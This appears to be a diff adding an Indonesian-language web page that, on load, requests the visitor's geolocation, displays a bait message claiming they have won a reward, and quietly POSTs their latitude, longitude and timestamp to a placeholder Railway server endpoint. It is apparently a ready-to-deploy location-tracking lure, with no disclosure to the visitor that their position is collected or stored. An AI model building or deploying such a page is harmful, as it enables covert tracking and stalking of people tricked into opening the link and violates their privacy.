@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Izin Lokasi</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f0f0f0;
+      color: #333;
+    }
+    #status {
+      font-size: 1.2em;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div id="status">Selamat Datang</div>
+  <script>
+    window.onload = function() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendPosition, showError);
+      } else {
+        document.getElementById("status").innerHTML = "Geolocation tidak didukung oleh browser ini.";
+      }
+    };
+
+    function sendPosition(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+      
+      // Tampilkan pesan dengan tautan ke Google Maps
+      document.getElementById("status").innerHTML = 
+        `Anda Dapat Reward!<br>` +
+        `<a href="${googleMapsLink}" target="_blank">Buka di Google Maps</a>`;
+
+      // Kirim data lokasi ke server
+      fetch('https://your-railway-app-name.up.railway.app/save-location', { // Ganti dengan URL Railway setelah deploy
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon,
+          timestamp: new Date().toISOString(),
+          googleMapsLink: googleMapsLink
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log('Lokasi berhasil dikirim ke server.');
+        } else {
+          console.error('Gagal mengirim lokasi.');
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        document.getElementById("status").innerHTML = "Gagal mengirim lokasi.";
+      });
+    }
+
+    function showError(error) {
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          document.getElementById("status").innerHTML = "Anda menolak izin lokasi.";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          document.getElementById("status").innerHTML = "Informasi lokasi tidak tersedia.";
+          break;
+        case error.TIMEOUT:
+          document.getElementById("status").innerHTML = "Permintaan lokasi timeout.";
+          break;
+        case error.UNKNOWN_ERROR:
+          document.getElementById("status").innerHTML = "Terjadi kesalahan tidak diketahui.";
+          break;
+      }
+    }
+  </script>
+</body>
+</html>
